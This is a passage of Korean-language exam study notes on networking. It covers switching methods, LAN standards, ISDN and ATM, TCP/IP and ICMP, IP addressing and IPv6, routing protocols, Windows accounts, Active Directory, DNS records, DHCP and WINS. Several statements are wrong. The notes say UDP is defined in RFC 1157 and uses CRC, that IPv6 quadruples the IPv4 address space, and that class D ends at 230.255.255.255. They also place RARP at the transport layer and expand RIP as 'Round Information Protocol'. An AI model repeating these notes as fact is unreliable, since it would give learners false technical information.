수 있는 팩시밀리 전송 통신경로가 설정되면 데이터의 형태, 부호, 전송제어 절차 등에 대한 제약을 받지않는다 종류 : 시분할 교환방식, 공간분할 교환방식\n메시지 교환망 전송되는 데이터를 일련의 메시지 단위로 교환 교환기가 송신측 컴퓨터의 메시지를 받아 축적하였다가 수신측 컴퓨터가 수신가능한 상태가 되면 정보전송 각 메시지마다 수신 주소를 붙여 전송하며, 전송 경로가 다르다. 응답시간이 느려 대화형 데이터 전송에는 부적합\n축적방식 - 패킷 교환망 메시지를 일정 길이의 전송단위로 작게 나눈 패킷단위로 전송하는 방식 패킷 - 메시지를 정해진 크기의 비트 수로 나눈 후 정해진 형식에 맞춰 만들어진 데이터 블록 모든 사용자 간에 빠른 응답시간을 제공하기 위해 사용 음성 전송보다 데이터 전송에 더 적합하며 전송량 제어와 전송 속도 변환이 가능. 전송 실패시 재전송 가능 대량의 패킷 전송시 전송지연이 발생 종류 : 가상회선, 데이터그램 방식\n데이터그램 방식 패킷 전송시 특정 경로 설정 없이 노드들의 트래픽 상황을 감안하여 전송되는 방식으로 각 패킷마다 목적지로 가기 위한 경로배정이 독립적으로 이루어짐. 적은양의 데이터 전송할 때 유리\n가상회선방식 패킷 전송 되기전에 각 단말기간에 논리적인 가상회선이 확정되어 패킷들이 순차적으로 전송되는 방식으로 여러 사용자가 하나의 통신회선을 공유할 수 있으므로 회선 이용률이 높다 특징 : 데이터 전송의 안정성, 신뢰성보장, 송수신 순거가 같음.\n근거리통신망(LAN) 일정지역 내의 설치된 통신망으로 각종 기기 사이의 통신을 실행 근거리에서 고속통신이 가능, 경로설정이 불필요, 확장성과 재배치가 용이, 오류발생율이 낮음\nLAN 통신장비 종류 라우터 분리된 네트워크를 연결하는 장치로 네트워크 계층 간의 최적의 경로를 설정 브리지 같은 LAN 프로토콜을 지닌 두 LAN을 연결하는 것으로 물리계층과 데이터링크계층 연결 허브 가까운 거리의 컴퓨터들을 연결하는 장비 리피터 감쇠된 신호를 증폭하여 네트워크 길이를 확장하여 깨끗한 신호를 수신할 수 있도록함 - \u0026gt; 물리계층 스위치 패킷이 전달되어야 할 경로를 제공해주는 역할 담당 게이트웨이 완전히 다른 프로토콜 구조를 갖는 네트워크를 연결하여 데이터 전송하도록 함.\nCSMA/CD방식 데이터 충돌을 막기위해 송신 데이터가 없을 때에만 데이터를 송신하고, 전송 도중 충돌이 감지되면 전송을 멈추고, 충돌을 알리는 잼 신호를 전송후 일정 시간이 흐른후 다시 재전송하는 방식 특징 통신량이 적을때는 채널 이용률이 높음. 어느 한 터미널이 고장나더라도 다른 터미널의 통신에 전혀 영향을 미치지 않음. 모든 제어기는 동등한 엑세스 권한이 있음. 회선상 데이터 없는 확인- \u0026gt; 데이터전송 - \u0026gt; 충돌발생(동시에 데이터 전송시 발생) - \u0026gt;회선 감지 이더넷 CSMA/CD방식을 사용하는 LAN 100MBPS이상을 고속 이더넷(fast ethernet) 10 BAST T - 전송속도가 10MBPS BASE - 베이스밴드 전송방식 T - 전송매체로 꼬임선 이용 10 BASE F - 전송매체로 광케이블 사용\n토큰패싱 방식 전송매쳉 접근하기 위해 토큰이라는 특정 패킷사용 통신회선에 대한 제어신호가 각노드들을 순차적으로 옮겨가면서 데이터를 전송하는 방식 토큰링 모든 노드사이에 물리적인 링이 연결되어 토큰이 링을 따라 순차적으로 전송\n토큰버스 모든 노드 사이에 버스형 토폴로지 이용, 토큰링과 구조는 같고 케이블의 양 끝에 신호의 바인딩 막기위한 터미네이터 장치 사용\nLAN표준 IEEE 802.2 LLC IEEE 802.3 CSMA/CD방식 IEEE 802.4 TOKEN버스 방식 IEEE 802.5 TOKEN링 방식 IEEE 802.11b 무선랜\n7.통신망\n종합정보통신망(ISDN) - Intergrated Services Digital Network 음성, 데이터 및 이미지 전송에 동일한 디지털 기술이 적용된 통합정보 시스템 통신망의 경제성과 효율성을 증대시키고 통신처리 기능을 고도화시킴 종류 B채널 - 64KBPS 이하의 가입자 정보전송용 채널(회선교환,패킷교환,전용회선 지원) D채널 - 회선교환방식을 위한 신호전송용채널(제어신호, 패킷전송 및 저용량 데이터 전송) H채널 - 대용량 가입자 정보전송용 채널(고속팩스, 고음질 음성 서비스)\n광대역종합정보통신망(B- ISDN) 광대역 전송 방식과 광대역 교환방식을 통해 가입자와 서비스 제공자를 연결하고 각종 광대역 및 협대역 서비스를 통합한 디지털 통신망 광섬유 전송 매체를 이용해 150MBPS- 600MBPS 전송속도를 가짐 비동기 전송모드의 전송방식으로 시분할 다중화 방식을 사용 기존 N- ISDN의 속도보다 훨씬 빠른 고속의 통신서비스와 광대역의 영상정보 및 초고속 데이터 전송이 가능\n부가가치 통신망(VAN) 공중 통신 회선에 교환설비, 컴퓨터 및 단말기 등을 접속시켜 새로운 부가 기능을 제공하는 통신망 기능 전송기능, 교환기능, 통신처리기능, 정보처리기능\n고속 LAN 1.Gigabit Ethernet (초당 1기가 비트의 전송률) 1000 base - x 특징 고속 이더넷(fast Ethernet)에 비해 전송속도는 10배 이상 빠르다. 케이블 매체는 UTP, Shieded Copper, Optical Fiber 등을 이용 종류 1000 BASE - CX : 1Gbps 속도로 2쌍의 STP사용 1000 BASE - LX : 1Gbps 속도로 2쌍의 장파장 다중 모드 또는 광섬유 단일모드 1000 BASE - SX : 1Gbps 속도로 2쌍의 단파장 다중 모드 광섬유 사용 1000 BASE - TX : 1Gbps 속도로 4,8쌍의 UTP Cat % 를 사용 2.FDDI (Fiber Distributed Date InterFace) - ANSI에서 제안한 고속 LAN기술 광섬유 케이블을 사용하도록 설계된 이중 링 구조의 통신망 (토큰링) 단일 또는 다중 모드의 광섬유 케이블 모드를 지원 이중 링은 기본링과 보조링으로 구성되며, 동작방향은 서로 반대. 기본링은 모든 전송의 책임을 지며, 고장시 보조링을 통해 우회 전송 케이블 매체는 UTP, STRP, 광섬유 등을 이용 A,B CLASS로 분류하며 대역폭이 좁다 종류 FDDI- I : 광섬유 케이블을 매체로 100Mbps의 전송속도를 제공 FDDI - II : FDDI- I 기능을 확장한 것으로 1000Mbps의 전송속도를 제공\n3.ATM(Asnchronous Trasnsfer Mode) B- ISDN의 핵심기술 회선교환과 패킷 교환의 중간 형태로 정보를 고정 길이의 블록으로 분할하여 순차적으로 전송 데이터는 셀교환기법을 통해 동일한 고정길이의 셀로 변환시켜 전송(패킷교환방식에 비해 전송속도, 전송효율면에서 좋음) 소량의 데이터 전송에는 부적합 셀 생성시 전송 지연, 전송량 증가로 인한 손실이 발생할 수 있다. 복수의 가상회선 연결이 가능 기본전송모드는 STDM 전송방식을 사용 53Byte 셀 단위 기반 계층구조 제1계층(물리계층) : TC와 PM부 계층으로 나뉘며, 전송매체 특성에 맞게 비트발생, 헤더 부분의 에러체크 부분을 발생 제2계층(ATM계층) : 데이터의 흐름제어 및 주소 지정 기능 수행 제3계층(AAL계층) : AAL(ATM Adaption Layer)- ATM 적응 계층\n8.무선기술\n이 부분은 시험에 잘 나오진 않더군요 참고하시길!! 그래서 큰 틀만 적었습니다.\nX.25 WAN에서 널리 쓰이는 프로토콜 LAPB 프로토콜 사용 3계층 지원(물리, 프레임, 패킷)하여 에러 체크 기능이 강력 패킷 단위로 데이터 전송하며, 상황에 따라 통신경로 찾아서 전송\n무선 네트워크 기술 데이터 전송을 위해 전파나 적외선을 이용하여 네트워크를 구축하는 것 IEEE 802.11에서 표준화 유선 LAN에 비해 설치 비용과 시간이 절감 다른 기기에서 발생하는 잡음과 전파 방해의 영향을 받음 통신속도가 제한되고 구간 내에서는 노드가 이동하면서 통ㅇ신을 함\n전송기법 적외선 기법, 협대역마이크로 웨이브, 스펙트럼 확산대역\n무선인터넷 기술용어 IMT- 2000 이동통신의 문제점을 해결하기 위해 전세계 여러 나라간 협의를 거쳐 제정한 차세대 이동통신 사용 주파수 대여근 1,885MHZ ~ 2,200 MHZ로 향상된 기술과 고품질의 통신이 가능\n블루투스 근거리에서 디지털 기기간 무선 접속 지원하기 위한 통신기술로 개인통신망(PAN)을 위해 개발 1대의 마스터가 7대까지 연결한느 피코넷으로 구성 모바일, PDA, 프린터, 헤드셋등에서 무선으로 정보 전송하고 공유\nWAP(Wireless Application Protocol) 모바일 폰, PDA 등의 이동식 단말기에서 무선 인터넷에 직접 접속하기 위한 통신규약 유선망과 무선망 사이에서 프로토콜 변환을 위해 WML사용 무선으로 자료 전송하고 받을수있는 기술로 전송속도가 느린 휴대전화망의 단점을 고려하여 게이트웨이 방식을 채택\nVoIP(Voice over Internet Protocol) 인터넷을 이용하여 음성을 송수신하는 인터넷 전화 서비스 전송 중 손실된 패킷은 복원이 안되므로 통화품질이 좋지 않음 장거리 음성, 팩스 등 고품질의 PSTN 제공\nVPN(Virtual Private Network) 공중전화망에 사설망을 구축하여 통신사업자에게 전용회선을 임대 기존 사설망의 높은 비용부담을 해소 공중망을 통해 데이터를 전송하므로 송신측에서 암호화, 수신측에서 복호화 함 기능 터널링 - 복잡한 구간을 하나의 연결 경로로 표현 인증 - 터널링을 위한 인증과 데이터 무결성 인증으로 구분 암호화 - 데이터 변조나 스니핑 방지위한 암호화 제공 접근제어 - 데이터 출발지의 IP인증과 허가된 사용자여부에 따라 접근권한 부여 종류 IPSec- VPN,SSL- VPN\n9.TCP/IP 프로토콜\nTCP/IP 프로토콜 개요 인터넷에서 가장 많이 사용되는 표준 프로토콜 OSI 계층의 전송계층과 네트워크 계층에서 동작하고, 상위의 응용프로그램을 구별한다.\nTCP 데이터의 전송 방법을 결정하는 프로토콜 OSI 7계층 중 전송계층에 해당하며 신뢰성 있는 연결형 서비스를 제공 패킷의 다중화, 순서제어, 오류 제어, 흐름 제어 기능을 제공 강력한 에러 제어기능이 있어서 정확한 데이터 전송 슬라이딩 윈도우 방식 패킷의 순차번호와 CRC 이용하여 신뢰성 있는 통신수행 프로토콜 : FTP, TELNET, HTTP, SMTP, POP\nIP 인터넷상에서 각 호스트의 주소를 결정하는 프로토콜 OSI 7계층의 네트워크 계층에 해당하며 데이터그램 기반으로 하는 비연결형 서비스 패킷의 분해/조립, 주소지정, 경로선택 기능을 제공\nTCI/IP 계층과 각 프로토콜 네트워크 계층(물리계층, 데이터링크계층) : Network interface 인터넷계층(네트워크 계층) : IP, ARP, RARP, ICMP 전송계층 :TCP,UDP 응용계층(세션, 표현, 응용계층) :FTP, TELNET, TFTP, DNS, SMTP, SNMP\n10.기본프로토콜\nUDP 프로토콜 데이터 전송 전 연결설정 작업을 하지 않음. 데이터 전송속도의 향상을 꾀하기 위해 흐름제어, 오류정정 기능이 없음 빠른 수행속도를 필요로 하는 응용 프로그램과 멀티미디어 데이터 실시간 전송에 적합 신뢰성이 낮은 데이터 전송과 짧은 데이터 고속 전송에 유리 데이터 전송단위는 블록 송신측에서 무조건 송신만을 수행 전송 중 패킷이 사라지면 여부를 알수 없음. 오버헤드가 적다. RFC 1157에 규정 오류검사 - CRC기법 프로토콜 - SNMP, TFTP, BOOTP\n라우팅 프로토콜 : RIP,IGRP,OSPF,BGP 라우티드 프로토콜 : TCP/IP, IPX, AppleTalk\nTCP/UDP 포트개념 및 특징 TCP/UDP 데이터 전송시 포트(프로토콜의 일련번호)를 이용 웹 브라우저 상에서 2개 이상의 사이트에 접속할 수 있으며, 서버도 여러곳으로부터 접속을 받음 접속하는 측의 포트: 1024번 이상의 번호, 접속받는 측의 포트: 1,024번 이하로 지정 Well- Known port - TCP/UDP 접속을 받기 위해 서버 포트가 미리 정해짐\nARP 프로토콜 IP주소를 물리적 네트워크 주소로 변환시켜주는 프로토콜, 브로드캐스트 기반\nRARP 프로토콜 클라이언트 PC에 IP주소를 자동으로 설정 하기 위한 프로토콜 전송계층에서 사용 ★물리적 MAC주소를 IP주소로 번역\nICMP(Internet Control Message Protocol) IP 프로토콜을 사용하는 네트워크에서 발생할 수 있는 여러정보에 대한 메시지 포함 TCP/IP를 이용하여 두 호스트간 통신을 담당하는 프로토콜 호스트간 에러보고, 도착가능검사, 혼잡제어, 수신측 경로 변경, 성능 측정, 서브넷 주소 기능제공 두 호스트간 신뢰성 있는 연결을 테스트하기위한 반향과 회답 메시지 지원 ICMP 에러메시지가 도착하면 ICMP 소프트웨어 모듈이 제어한다.\nICMP패킷 종류  TYPE 종류 0 Echo Reply 3 Destination UnReachable 4 Source Quench 5 Redirection Required 8 Echo Request 11 Time To Live Exceeded 12 Parameter Problem 13 Timestamp Request 14 Timestamp Reply 17 Address Mask Request 18 Address Mask Reply Echo Reply/Request : debugging 목적으로 한쌍으로 동작.\nICMP패킷 개념 3.Destination Unreachable - 라우터가 해당 패킷을 목적지로 보낼수 없거나 정상적으로 이루어지지 않을때 라우터가 클라이언트에게 응답.\n4.Source Quench - 송신측 데이터 전송속도를 늦춰달라는 메시지로, 패킷 전송 도중 중간장비에 회선의 혼잡상황이 발생하여 패킷이 손실되거나 파괴될 경우 사용\n5.Redirection Required - 경로 설정 부분에서 현재의 게이트웨이보다 더 좋은 게이트웨이가 있을 경우, 경로변경 설정 요청을 하는 메시지\n11.Time To Live Exceeded - IP패킷이 네트워크에서 존재할 수 있는 시간을 초과할 경우 사용\n12.Parameter Problem - 패킷을 전송할 때 ip헤더에서 에러가 발생할 경우 사용\n13/14.Timestamp Request and Reply - 목적지까지의 지연시간을 측정하는 메시지\n17/18 Address Mask Request/Reply - 네트워크에서 사용중인 서브넷 마스크를 알고자 할 경우 사용\nIGMP(Internet Group Management Protocol) IP 멀티캐스트 그룹에서 호스트 멤버들을 관리하는 프로토콜 IP 멀티캐스트 그룹 - 특정 멀티캐스트 IP주소로 전달되는 IP트래픽을 감시하는 호스트들의 집합 멀티캐스트를 지원하는 호스트와 라우터에 의해 사용되며 t TTL이 제공되는 비대칭 프로토콜\nSMTP(Simple Mail Transfer Protocol) 단순 이메일 송신할 때 이용되는 TCP 응용 프로토콜 TCP/IP 호스트의 우편함에 ASCII 문자 메시지를 전송 이메일을 사용하면 SSL을 이용하여 암호화된 편지를 받을 수 있어서 안전 메일을 하나의 프로세스에서 동일한 네트워크나 다른 네트워크에 있는 프로세스로 전송할 수 있다. 포트:25번\nPOP(Post Office Protocol) 서버와 클라이언트 간에 메일을 주고받을 때 사용하는 tcp 응용프로토콜 사용자가 메일 서버에서 메일을 읽을 수 있도록 고안, POP서버에서 사용자 PC로 메일을 전달 서버에 접근하여 개인 E- MAIL을 복사하므로, 기본 인증기능이 제공 클라이언트가 서버의 메일을 수신할 때 서버 사이에 통신경로를 확립해야한다.\nSNMP(Simple Network Management Protocol) TCP/IP 프로토콜에 의해서 동작하는 망관리 프로토콜 UDP 데이터그램 방식 사용하여 전송 IETF의 RFC 1157에 표준 권고안 보안에 취약하고, 시스템 관리 기능이 좋지않음. 4가지기능(GET,GET NEXT,SET,TRAP)만 수행 비동기식 요청/응답 메시지 프로토콜 포트 : 161,162번\nDNS(Domain Name System) 인터넷에서 호스트 연결을 위해 IP 주소 사용. IP주소는 숫자로 구성되어 사용자가 기억하기 어려워서 문자방식인 도메인네임을 사용 실제접속을 위해 문자로 구성된 도메인네임을 인식가능한 IP주소로 변경 DNS서버는 광범위한 도메인과 IP 정보를 작게 나누어서 서로 다른 컴퓨터에 분산 UCP/UDP 포트 : 53번 오른쪽으로 갈수록 상위 도메인 WWW(호스트이름).NAVER(기관명).CO(기관종류).KR(국가도메인/루트 도메인)\n11.IP \u0026amp;IPv6\nIP(Internet Protocol) 네트워크를 통해 데이터를 전달하는 프로토콜 호스트의 인터넷 주소를 결정 IP 주소는 32bit 길이를 가지며, network ID, host ID로 구성 현재 사용하는 IP주소는 IPv4로 8비트씩 4옥텟으로 32Bit구성 동일한 네트워크 상의 모든 호스트는 같은 네트워크 id를 가진다.\nA클래스 범위 : 1.0.0.0 ~ 126.255.255.255 IP 시작비트 0 국가나 대형 네트워크에서 사용\nB클래스 범위 : 128.0.0.0 ~ 191.255.255.255 IP 시작비트 10 중대형 네트워크에서 사용\nC클래스 범위 : 192.0.0.0 ~ 223.255.255.255 IP 시작비트 110 소형네트워크에서 사용\nD클래스 IP 시작비트 1110 범위 : 224.0.0.0 ~ 230.255.255.255 IP 멀티캐스트 기능 수행을 위한 주소 멀티캐스트 - 네트워크 상에서 여러노드가 수신할 수 있는 특정 송출번지를 지닌 패킷\nE클래스 IP 시작비트 1111 실험용으로 사용 일반 PC에 직접설정 불가능\nIPv6 IP주소의 부족현상을 해결하기 위한 차세대 IP추소체계 IPv4의 주소 공간을 4배 확장한 것으로 128비트 체계의 16진수로 표기하며, 4개의 16진수를 콜론(:)으로 구분 IPv4에서는 옵션 필드의 구성이 제한적인데 비해 IPv6에서는 확장헤더를 이용하여 IPv4보다 훨씬 다양하고 안정된 옵션을 사용할 수 있음. 라우터의 부담을 줄이고, 네트워크 부하를 분산시킴 보안, 인증, 라벨링, 데이터 무결성, 데이터 비밀성 제공 특정 흐름의 패킷들을 인식하고 확장된 헤더에 선택사항들을 기술할 수 있음\nIPv6종류 : 유니캐스트, 애니캐스트, 멀티캐스트 유니캐스트 : 한 개의 노드에 대한 통신으로 단일목적지를 지정하는 주소형태로 네트워크의 인터페이스들은 주소부여가 가능한 한 수신지가 되어야함\n애니캐스트 : 동시에 복수개의 인터페이스에 주소 부여가 가능한 형태로 해당 주소로 보내진 패킷은 노드 그룹들 중 하나에만 전달됨(라우팅 프로토콜의 거리 측정에 따라 결정)\n멀티캐스트 : 여러 개 노드가 수신할 수 있는 특정 송출지 번지를 지닌 형태로 해당 주소로 보내진 패킷은 그룹의 모든 노드들에게 전달됨.\n12.서브넷 마스크, 라우팅\n서브넷 마스크 Ip주소의 공간 낭비 문제를 해결하기 위해 서브넷 개념 이용 IP주소 부분에서 network부분과 host부분을 구분해주는 역할 호스트 이름으로붙 ip주소지에 대한 네트워크의 이름을 규정 패킷 전달과 대규모의 클래스를 나누거나 합하기 위해 존재 서브넷마스크 사용자가 ip주소를 사용할 때 지정해주는 것으로 왼쪽 bit부터 1로 시작 서브넷마스크 할당방법 - 맨 왼쪽 비트부터 연속적 1이표시된 부분까지 네트워크부분 그외 나머지 호스트 부분\n기본 서브넷마스크 서브넷마스크는 ip주소와 달리 클래스 개념이 없고 앞에서부터 순차적으로 1씩 증가 IPv4의 서브넷마스크는 ip주소와 같이 32비트 2진수로 구성 ip주소만 있고 서브넷이 없는 경우 서브넷 마스크를 해당 주소대역의 기본으로 사용\n가용한 호스트가 29개가 되기위해서는? 11111111.11111111.11111111.11100000\n1까지가 네트워크부분 0이 호스트부분 2의5(호스트의개수)승 = 32 라우팅 데이터 패킷을 목적지까지 전송하기 위해 경로를 설정해주는 방법 IP주소의 목적지 주소를 확인하여 해당 목적지까지의 최적의 경로를 지정 라우팅은 라우터 장비가 수행 즉, 라우팅 정보를 가진 라우터는 다른 라우터들과 주기적으로 교환함으로써 목적지까지 데이터 패킷을 전송 라우터는 모든 경로에 대한 정보를 라우팅 테이블에 저장,관리 라우팅이 가능한 프로토콜을 이용하여 호스트간 교신 수행\n정적 라우팅 목적지까지의 경로가 고정되어 있는 라우팅 관리자가 직접 수동으로 테이블 매핑 설정 소규모 네트워크에 적합, 네트워크의 변경이 크지 않은 환경에 적합 상호연결 네트워크가 적고, 트래픽 예측이 쉬운 환경에 적합 기존 경로에 장애 발생시 관리자가 직접 수동으로 재설정해줘야 하는 번거로움이 존재\n동적 라우팅 목적지까지 경로가 그때 그때 상황에 따라 변경되는 라우팅기법 트래픽이 변경되는 경우 자동으로 경로가 변경 망간의 최적의 경로는 routing Metric으로 결정 네트워크의 변화를 분석하여 라우팅 테이블 자동으로 업데이트(관리자의 설정작업 불필요) 경로의 장애 발생시 유연한 대처가 가능 초기 설정작업이 복잡하고, 라우팅 테이블이 서로 동일해야 함 라우팅 테이블의 유지관리를 위한 트래픽 증가 메모리 자원의 소모가 큼 프로토콜 : RIP, OSPF, BGP\n라우팅 프로토콜 패킷을 목적지까지 전송하기 위해 라우터 경로 설정하고 제어 거리벡터 알고리즘 방식 - 라우팅 테이블 유지할 때 목적지 거리를 라우터 수(Hop count)로 계산 종류 : RIP, BGP RIP(Round Information Protocol) 라우터 홉수에 따라 최단거리를 결정하는 프로토콜 홉수가 최대 16이므로 대규모 네트워크에는 부적합 라우터 정보 수명이 짧아서 외부라우터와 일정시간 이상 교신이 끊기면 라우팅 정보를 삭제 전체 라우팅 테이블을 가장 가까운 호스트에 매 30초마다 전송\nBGP(Border Gateway Protocol) 현재 인터넷에서 AS 사이에 사용되고 있는 대표적인 EGP 라우팅 프로토콜 TCP 포트를 이용하므로 신뢰할 수 있는 연결 지향적인 특징 가짐 거리 벡터 라우팅을 수행하며, 루프가 발생하지 않음. AS가 다른 여러 AS와 연결되어 있는 경우에 사용\nAS(Autonomous System) 동일한 내부 라우팅과 보안정책을 사용하고 있는 망들의 집합을 의미 AS의 관리자는 자신의 AS에 대해 독자적으로 필요한 변경 및 유지보수 작업을 수행.\n링크상태 알고리즘방식 목적지 거리를 라우터의 연결속도를 기준으로 계산 종류 : OSPF 네트워크에 변화가 있을때만 정보교환 멀티캐스트 기법 라우터 사이의 연결속도를 중심으로 라우팅 자신의 현재 상태를 알려줌. 자율시스템(AS)에서 사용하기 위해 설계되어, 라우터 끼리 그룹을 가져 그 그룹끼리만 라우팅 가능 사용자에 의한 경로 지정과 복수 경로 지정이 가능 라우팅 알고리즘이 복잡하여 라우터에 부담 VLSM 기술 지원하므로 IP주소 낭비 방지\n13.계정과 그룹 \u0026amp;파일시스템\n로컬 사용자 계정(Loca User Account) 관리자가 임의로 등록하는 계정으로서 사용자는 계정이 존재하는 서버로만 로그온이 가능 일반적 계정은 모두 여기에 해당 허가된 서버 자원만 엑세스 가능 하나의 시스템에 로그인할 때 사용 계정 만료 기간을 두어 일정기간이 지나면 해당 계정을 사용하지 못하도록함\n내장 사용자 계정 Window 2000 설치시 관리자가 등록하지 않아도 미리등록되는 계정으로 삭제, 수정 허용안됨 시스템을 직접 이용하거나 계정정보가 시스템 설정과 연동되어 해당 계정의 권한이나 설정을 바꿈\n내장 그룹의 종류 Administrators 일반 사용자가 administrators 그룹에 구성원이 되면 관리자와 동등한 자격을 가짐 관리자 계정과 id가 달라서 관리자는 될 수 없지만, 실제 서버를 제어할 수 있는 권한은 가짐 권한 : 사용자 계정추가 및 삭제, 응용 프로그램 설치, 디스크 포맷\nBackup Operators 그룹구성원은 파일 사용 권한에 관계없이 컴퓨터 파일을 백업하거나 복원 권한 : 컴퓨터 로그온, 시스템 종료와 재부팅 수행\nPower users 그룹 구성원은 사용자 계정을 생성하거나 삭제할 수 있지만 계정 사용자는 자신의 계정에 대한 수정/삭제 권한만 가짐 관리자에게 계정관리를 위한 목적으로 권한을 위임할 때 사용 권한 : 장치 드라이버의 보안과 프린터 설치 등의 관리자 권한을 가짐.\nUsers 그룹 구성원은 응용 프로그램, 로컬 네트워크, 네트워크 프린터를 사용하며, 로그아웃 및 화면 잠금 작업을 수행 ※ 시스템 설정 변경은 하지 못함 권한 : 로컬 그룹생성, 자신이 만든 로컬 그룹을 삭제할 수 있는 권한\nGuest 임시 사용자들에게 시스템의 제한적 기능을 사용하면서 로그온 일반 사용자를 geust 그룹에 등록하면 기본 사용과 종료는 가능하지만 다른 사용자들에 비해 제한 받음\nEveryone 시스템에 접근하는 모든 사용자 계정을 의미\n파일시스템 컴퓨터나 파일에 구별을 위한 이름을 붙이고, 저장이나 검색을 위해 그것들을 어디에 위치시킬 것인지를 결정. 모든 운영체제는 각각의 파일시스템을 사용하는데 서로 호환이 되지 않고 독특한 자신들만의 파일시스템을 만들어 운영\n윈도우 - FAT16,FAT32,NTFS 리눅스 - EXT2,EXT3,raiserFS\nNTFS(NT File System) 개념과 특징 NTFS는 Windows 버전의 기본 설정 파일 시스템 FAT32에서는 가능하지 않은 일부 디스크 관련 오류를 자동으로 복구. 대용량 디스크, 긴 파일 이름지원에 대한 기능 향상 사용 권한 및 암호화를 사용하여 승인된 사용자에게만 특정 파일을 액세스 할 수 있게해주므로 보안향상 디스크 결험 허용기능을 제공하여 다중 디스크 시스템에서 한 하드 디스크의 손실로부터 데이터를 보호 특정 파일이나 파일들이 있는 디렉토리를 자동적으로 압축할 수 있는 기능 지원 여러 개의 하드 디스크를 묶어 소프트웨어 적인 RAID를 구축 FAT에서 NTFS 파일시스템으로변환가능하지만 반대는 불가능 파일의 압축 저장과 실시간 복구 지원 파일 시스템 장애 발생시 FAT에 비해 복구가 어려움\nFAT(File Allocation Table) 개념과 특징 NT4에서 사용할 수 있는 가장 단순하고 최저 성능의 파일 시스템 다른 운영체제와의 호환성이 우수 단순한 구조와 높은 신뢰성, 많은 메모리를 필요하지 않음 저용량 볼륨에서 사용시 성능 우수 보안기능 취약 FAT에서 NTFS변환 : Convert 드라이브명 /fs:ntfs\n14.Active Driectory \u0026amp;DNS레코드\nActive Directory 시스템에서 원하는 사용자, 데이터베이스, 분산 구성요소, 리소스, 문서, 전자우편주소등의 개체를 조직적으로 관리하고 찾기 위한 도구로 사용 대규모 네트워크를 사용 DNS,TCP/IP 지원 및 LDAP와 같은 표준 프로토콜 지원을 포함하는 크로스 플랫폼 디렉토리서비스를 위한 개방형 표준 지원 도메인 콘트롤러의 이름과 위치를 사용하기 위해 DNS를 이용 Window환경에서 동일한 데이터베이스를 이용한 다양한 네트워크 서비스 제공 손쉬운 이행과 사용을 위해 표준 이름 형식 지원 풍부한 API 세트 제공 단순하고 계층적인 도메인 구조와 끌어서 놓기 방식의 간단하고 직관적인 관리 액티브 디렉토리에 의해 생성되는 구형의 카탈로그통한 신속하고 유연한 조회\n구성요소 : 도메인, 조직단위(OU), 도메인 트리, 포리스트, 글로벌 카탈로그, 도메인 컨트롤러, 사이트\nDNS(Domain Name Server) 특징 DHCP와 연동됨 주 영역 또는 보조 영역 관리 주 영역과 보조 영역이으로 나뉜다. 보조영역은 주영역으로부터 복제된 복사본을 가진다. 정방향 조회 - domain 주소를 ip주소로 변환하는 영역\n쿼리 요청 1.로컬 영역 검색 2.캐시 검색 3.다른서버에 요청\nDNS 레코드 1.SOA 레코드 DNS를 설정하는 zone파일은 항상 SOA레코드로 시작\n 도메인 영역의 등록 정보 내용을 저장 주 영역 서버와 보조 영역 서버간의 동기화에 대한 정보와 다른 DNS서버의 영역정보를 얼마만큼 보유할 수 있는지에 대한 시간 정보 값  Serial : 보조영역이 ZONE의 수정여부를 알 수 있도록 하기위함 Refresh : 주서버의 zone 수정여부를 보조 영역이 검사.DNS변경이 잦을 경우 주기를 짧게 기술 Retry : 보조영역에서 Primary로 연결되지 않을 경우 재시도 주기를 기술 Expire : 보조영역에서 지정한 시간동안 Primary에 연결하지 못할 경우 해당 도메인이 유효하지 않다고 여기는 접속만료시간 Minimum : 다른 네임서버가 현재 ZONE정보를 가지고 갈 경우 그 정보에 대해 CACHE에 존 시간을 지정\n2.NS 레코드 주 영역 서버에서 변경된 내용을 보조 영역 서버로 실시간 전송할 때 주영역 서버에서 보조용역 서버들의 주소를 지정,이름 서버\n3.MX레코드 전자 메일을 보낼 위치를 가리킴. 여기에는 우선 순위 필드도 있어 우선 순위대로 여러서버에 메일을 전송할 수 있음.메시지 라우팅을 제공.\n4.A레코드 P 주소와 도메인 이름을 연결, 호스트 이름을 IPv4주소로 매핑한다.\n5.CNAME(구글치면 www.google.com로 바뀜) DNS 시스템의 한 도메인을 다른 도메인으로 리디렉션. 이름 서버가 도메인을 조회하여 CNAME 레코드가 있다는 것을 발견하면 첫번째 도메인 이름을 CNAME으로 대체하고 새 이름을 조회\n6.PTR레코드 IP주소에 대해 도메인명을 매핑하여 주는 역할.Reverse Zone파일에서 사용\n15.DHCP \u0026amp;WINS\nDHCP\n 관리자가 수동으로 IP주소를 입력하지 않고 모든 컴퓨터에 자동으로 IP주소를 전달하는 자동설정 방법 제공 네트워크 관리자의 많은 시간과 노력을 줄인다. 서브넷마스크, 기본게이트웨이, DNS서버, WINS 서버 주소를 배분할 수 있으며 네트워크 구조에 따라 이들 모두 혹은 일부만 사용선택할 수 있음. IP주소 추적 가능  WINS(Windows Internet Name Service) NetBIOS 개념\n 윈도우의 네트워크 상에서 컴퓨터 이름을 나타내기 위한 고유한 이름 값들을 부여하여 각자의 컴퓨터를 확인 NetBIOS 이름은 16바이트를 사용. 이중 15바이트는 컴퓨터의 이름 마지막 1바이트는 이 컴퓨터가 어떤 서비스를 제공하는지 확인할 수 있는 접미사를 표현하는데 사용 기본적으로 브로드캐스트를 사용하여 호스트와 통신하므로, 네트워크에 많은 트래픽을 줌 NetBIOS 이름을 해석하기 위한 방법에는 LMHOST,WINS, HOST,DNS 등이 있음 HOST : 전체 도메인 이름(FQDN)을 이용하여 이름을 검색하는 파일 LMHOST - 다른 네트워크에 있는 NetBIOS를 사용하는 컴퓨터에 접속할 수 있다는 장점이 있지만, 각각의 컴퓨터에 Imhosts를 복사하여 가지고 있어야 한다는 단점이 존재, 또한 특정 컴퓨터의 IP변경시 모든 lmhosts를 업데이트 해주어야 하는 번거로움이 존재.  WINDS의 개념과 특징\n 네트워크에 있는 컴퓨터와 그룹에 대한 NetBIOS이름에 대응되는 ip주소를 찾아주는 서버 Windows NT 서버의 일부로 컴퓨터 이름 정보를 저장하거나 조회할 수 있음. 호스트 이름과 IP 주소 데이터베이스를 저장하는 독립된 서버를 네트워크에서 관리 컴퓨터가 다른 장소로 이동되면 IP주소의 서브넷 부분이 변경됨. 컴퓨터 이름과 IP주소 매핑을 위한 데이터를 테이블 내에서 자동 생성. 호스트 이름을 TCP/IP 주소로 매핑하는 데이터베이스를 유지함으로써 TCP/IP의 모든장점을 이용하여 쉽게 다른 호스트와 통신할 수 있다. 브로드캐스트 패킷을 가로채고 내부에서 처리하여 네트워크의 부하를 줄일 수 있다. ===고려사항 컴퓨터는 고정 